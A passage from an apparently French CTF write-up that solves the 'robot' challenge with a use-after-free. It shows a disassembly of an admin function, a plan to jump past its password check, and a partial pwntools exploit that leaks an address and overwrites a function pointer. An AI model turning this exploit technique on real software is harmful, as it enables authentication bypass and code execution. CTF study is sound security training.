<p>L&rsquo;option <strong>2</strong> nous permet de &ldquo;faire parler le robot&rdquo;, concrètement, elle appelle la fonction <code>makeNoise</code>, ce serait donc un bon candidat à réecrire puisqu&rsquo;il ne se passe rien de plus dans cette option.</p>
<p>Maintenant que nous savons quelle fonction réecrire, par quoi pouvons-nous la réecrire ?</p>
<p>La fonction <code>admin</code> contient un appel à <code>/bin/cat flag.txt</code> mais elle semble protégée par un mot de passe&hellip; ou l&rsquo;est-elle réellement ? Puisque nous connaissons l&rsquo;adresse de <em>roll</em>, rien ne nous oblige à réecrire <code>makeNoise</code> par l&rsquo;adresse de <code>admin</code>, nous pouvons très bien la réecrire par une adresse plus loin dans <code>admin</code>, de préférence <strong>après</strong> la vérification du mot de passe.</p>
<p>On peut faire ceci avec <code>pwndbg</code> et notre <em>leak</em> de tout à l&rsquo;heure, on va commencer par désassembler la fonction <code>admin</code> pour savoir où <em>jump</em>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>disass admin
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Dump of assembler code <span style="color:#66d9ef">for</span> function admin:
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b13d7</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">0</span><span style="color:#f92672">&gt;</span>:	push   rbp
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b13d8</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">1</span><span style="color:#f92672">&gt;</span>:	mov    rbp,rsp
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b13db</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">4</span><span style="color:#f92672">&gt;</span>:	sub    rsp,<span style="color:#ae81ff">0x90</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b13e2</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">11</span><span style="color:#f92672">&gt;</span>:	mov    QWORD PTR [rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x88</span>],rdi
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b13e9</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">18</span><span style="color:#f92672">&gt;</span>:	mov    rax,QWORD PTR fs:<span style="color:#ae81ff">0x28</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b13f2</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">27</span><span style="color:#f92672">&gt;</span>:	mov    QWORD PTR [rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x8</span>],rax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b13f6</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">31</span><span style="color:#f92672">&gt;</span>:	xor    eax,eax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b13f8</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">33</span><span style="color:#f92672">&gt;</span>:	mov    rax,QWORD PTR [rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x88</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b13ff</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">40</span><span style="color:#f92672">&gt;</span>:	mov    rdi,rax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b1402</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">43</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x55a4252b10c0</span> <span style="color:#f92672">&lt;</span>strlen<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b1407</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">48</span><span style="color:#f92672">&gt;</span>:	mov    rcx,rax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b140a</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">51</span><span style="color:#f92672">&gt;</span>:	lea    rdx,[rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x70</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b140e</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">55</span><span style="color:#f92672">&gt;</span>:	mov    rax,QWORD PTR [rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x88</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b1415</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">62</span><span style="color:#f92672">&gt;</span>:	mov    rsi,rcx
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b1418</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">65</span><span style="color:#f92672">&gt;</span>:	mov    rdi,rax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b141b</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">68</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x55a4252b1090</span> <span style="color:#f92672">&lt;</span>SHA256<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b1420</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">73</span><span style="color:#f92672">&gt;</span>:	mov    DWORD PTR [rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x74</span>],<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b1427</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">80</span><span style="color:#f92672">&gt;</span>:	jmp    <span style="color:#ae81ff">0x55a4252b145f</span> <span style="color:#f92672">&lt;</span>admin<span style="color:#f92672">+</span><span style="color:#ae81ff">136</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b1429</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">82</span><span style="color:#f92672">&gt;</span>:	mov    eax,DWORD PTR [rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x74</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b142c</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">85</span><span style="color:#f92672">&gt;</span>:	cdqe   
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b142e</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">87</span><span style="color:#f92672">&gt;</span>:	movzx  eax,BYTE PTR [rbp<span style="color:#f92672">+</span>rax<span style="color:#f92672">*</span><span style="color:#ae81ff">1</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x70</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b1433</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">92</span><span style="color:#f92672">&gt;</span>:	movzx  eax,al
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b1436</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">95</span><span style="color:#f92672">&gt;</span>:	mov    edx,DWORD PTR [rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x74</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b1439</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">98</span><span style="color:#f92672">&gt;</span>:	add    edx,edx
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b143b</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">100</span><span style="color:#f92672">&gt;</span>:	movsxd rdx,edx
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b143e</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">103</span><span style="color:#f92672">&gt;</span>:	lea    rcx,[rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x50</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b1442</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">107</span><span style="color:#f92672">&gt;</span>:	add    rcx,rdx
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b1445</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">110</span><span style="color:#f92672">&gt;</span>:	mov    edx,eax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b1447</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">112</span><span style="color:#f92672">&gt;</span>:	lea    rsi,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0xc5f</span>]        <span style="color:#75715e"># 0x55a4252b20ad</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b144e</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">119</span><span style="color:#f92672">&gt;</span>:	mov    rdi,rcx
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b1451</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">122</span><span style="color:#f92672">&gt;</span>:	mov    eax,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b1456</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">127</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x55a4252b10d0</span> <span style="color:#f92672">&lt;</span>sprintf<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b145b</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">132</span><span style="color:#f92672">&gt;</span>:	add    DWORD PTR [rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x74</span>],<span style="color:#ae81ff">0x1</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b145f</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">136</span><span style="color:#f92672">&gt;</span>:	cmp    DWORD PTR [rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x74</span>],<span style="color:#ae81ff">0x1f</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b1463</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">140</span><span style="color:#f92672">&gt;</span>:	jle    <span style="color:#ae81ff">0x55a4252b1429</span> <span style="color:#f92672">&lt;</span>admin<span style="color:#f92672">+</span><span style="color:#ae81ff">82</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b1465</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">142</span><span style="color:#f92672">&gt;</span>:	lea    rax,[rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x50</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b1469</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">146</span><span style="color:#f92672">&gt;</span>:	lea    rsi,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0x2bb0</span>]        <span style="color:#75715e"># 0x55a4252b4020 &lt;encrypted&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b1470</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">153</span><span style="color:#f92672">&gt;</span>:	mov    rdi,rax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b1473</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">156</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x55a4252b1120</span> <span style="color:#f92672">&lt;</span>strcmp<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b1478</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">161</span><span style="color:#f92672">&gt;</span>:	test   eax,eax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b147a</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">163</span><span style="color:#f92672">&gt;</span>:	jne    <span style="color:#ae81ff">0x55a4252b14b6</span> <span style="color:#f92672">&lt;</span>admin<span style="color:#f92672">+</span><span style="color:#ae81ff">223</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b147c</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">165</span><span style="color:#f92672">&gt;</span>:	mov    ecx,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b1481</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">170</span><span style="color:#f92672">&gt;</span>:	lea    rdx,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0xc2a</span>]        <span style="color:#75715e"># 0x55a4252b20b2</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b1488</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">177</span><span style="color:#f92672">&gt;</span>:	lea    rsi,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0xc2c</span>]        <span style="color:#75715e"># 0x55a4252b20bb</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b148f</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">184</span><span style="color:#f92672">&gt;</span>:	lea    rdi,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0xc25</span>]        <span style="color:#75715e"># 0x55a4252b20bb</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b1496</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">191</span><span style="color:#f92672">&gt;</span>:	mov    eax,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b149b</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">196</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x55a4252b1070</span> <span style="color:#f92672">&lt;</span>execl<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b14a0</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">201</span><span style="color:#f92672">&gt;</span>:	lea    rdi,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0xc1d</span>]        <span style="color:#75715e"># 0x55a4252b20c4</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b14a7</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">208</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x55a4252b1140</span> <span style="color:#f92672">&lt;</span>perror<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b14ac</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">213</span><span style="color:#f92672">&gt;</span>:	mov    edi,<span style="color:#ae81ff">0x2</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b14b1</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">218</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x55a4252b1050</span> <span style="color:#f92672">&lt;</span>exit<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b14b6</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">223</span><span style="color:#f92672">&gt;</span>:	lea    rdi,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0xc0d</span>]        <span style="color:#75715e"># 0x55a4252b20ca</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b14bd</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">230</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x55a4252b1040</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b14c2</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">235</span><span style="color:#f92672">&gt;</span>:	nop
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b14c3</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">236</span><span style="color:#f92672">&gt;</span>:	mov    rax,QWORD PTR [rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x8</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b14c7</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">240</span><span style="color:#f92672">&gt;</span>:	sub    rax,QWORD PTR fs:<span style="color:#ae81ff">0x28</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b14d0</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">249</span><span style="color:#f92672">&gt;</span>:	je     <span style="color:#ae81ff">0x55a4252b14d7</span> <span style="color:#f92672">&lt;</span>admin<span style="color:#f92672">+</span><span style="color:#ae81ff">256</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b14d2</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">251</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x55a4252b1110</span> <span style="color:#f92672">&lt;</span>__stack_chk_fail<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b14d7</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">256</span><span style="color:#f92672">&gt;</span>:	leave  
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b14d8</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">257</span><span style="color:#f92672">&gt;</span>:	ret    
</span></span><span style="display:flex;"><span>End of assembler dump<span style="color:#f92672">.</span>
</span></span></code></pre></div><p>L&rsquo;instruction <code>jne</code> située à <code>+163</code> est une condition, probablement celle qui compare notre input avec le mot de passe, nous voulons donc arriver juste après cette condition, soit à <code>+165</code>. Pour calculer la différence entre les deux, il suffit de prendre l&rsquo;adresse de cette instruction et d&rsquo;y soustraire l&rsquo;adresse de <code>roll</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>print <span style="color:#ae81ff">0x000055a4252b147c</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x55a4252b12fc</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">5</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">384</span>
</span></span></code></pre></div><p>Une fois qu&rsquo;on a notre <em>leak</em>, il nous suffit donc d&rsquo;y ajouter <code>384</code> pour trouver l&rsquo;adresse de <code>admin+165</code>.</p>
<p>Il ne nous reste plus qu&rsquo;à créer un manuel avec <strong>16</strong> chars, puis l&rsquo;adresse de <code>admin+165</code> pour réecrire <code>makeNoise</code> dans la <em>Struct</em> &ldquo;Robot&rdquo;</p>
<h2 id="tldr">TLDR</h2>
<ol>
<li>Créer un robot (<em>malloc</em>)</li>
<li>Jouer avec le robot (<em>free</em>)</li>
<li>Créer un manuel (<em>malloc</em>)</li>
<li>Lire le manuel (<em>UAF/leaks</em>)</li>
<li>Calculer la différence entre <em>roll</em> et <code>admin+165</code></li>
<li>Créer un robot (<em>malloc</em>)</li>
<li>Jouer avec le robot (<em>free</em>)</li>
<li>Créer un manuel de 16 caractères suivis de l&rsquo;adresse de <code>admin+165</code> (malloc/bleep overwrite)</li>
<li>Faire parler le robot (<em>call <code>admin+165</code></em>)</li>
</ol>
<h2 id="exploit">Exploit</h2>
<p>Et voici donc l&rsquo;exploit final:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> time <span style="color:#f92672">import</span> sleep
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>exe <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./robot&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> exe
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">conn</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>LOCAL:
</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> process([exe<span style="color:#f92672">.</span>path])
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>GDB:
</span></span><span style="display:flex;"><span>            gdb<span style="color:#f92672">.</span>attach(r)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;challenges.france-cybersecurity-challenge.fr&#34;</span>, <span style="color:#ae81ff">2101</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> r
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">construire</span>(name):
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;construire(&#34;</span><span style="color:#f92672">+</span>str(name)<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;)&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>recv()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendline(name)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>recv()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">parler</span>():
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;parler()&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> r<span style="color:#f92672">.</span>recv()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">supprimer</span>():
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;supprimer()&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;3&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>recv()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">mode_emploi</span>(text):
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;mode_emploi(&#34;</span><span style="color:#f92672">+</span>str(text)<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;)&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;4&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>recv()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendline(text)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>recv()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">manuel</span>():
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#39;manuel()&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;5&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> r<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)[<span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">global</span> r
</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> conn()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># robot = malloc()</span>
</span></span><span style="display:flex;"><span>    construire(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">16</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># free(robot)</span>
</span></span><span style="display:flex;"><span>    supprimer()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># manuel = malloc()</span>
</span></span><span style="display:flex;"><span>    mode_emploi(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">16</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># manuel-&gt;guide</span>
</span></span><span style="display:flex;"><span>    leak <span style="color:#f92672">=</span> manuel()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    roll <span style="color:#f92672">=</span> u64(leak[leak<span style="color:#f92672">.</span>index(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xfc</span><span style="color:#e6db74">&#39;</span>):]<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;roll @&#34;</span>, hex(roll))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    flag <span style="color:#f92672">=</span> roll <span style="color:#f92672">+</span> <span style="color:#ae81ff">384</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;flag @&#34;</span>, hex(flag))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># robot = malloc()</span>
</span></span><span style="display:flex;"><span>    construire(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">16</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># free(robot)</span>
</span></span><span style="display:flex;"><span>    supprimer()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># manuel = malloc()</span>
</span></span><span style="display:flex;"><span>    mode_emploi(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">16</span> <span style="color:#f92672">+</span> p64(flag))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># robot-&gt;makeNoise</span>
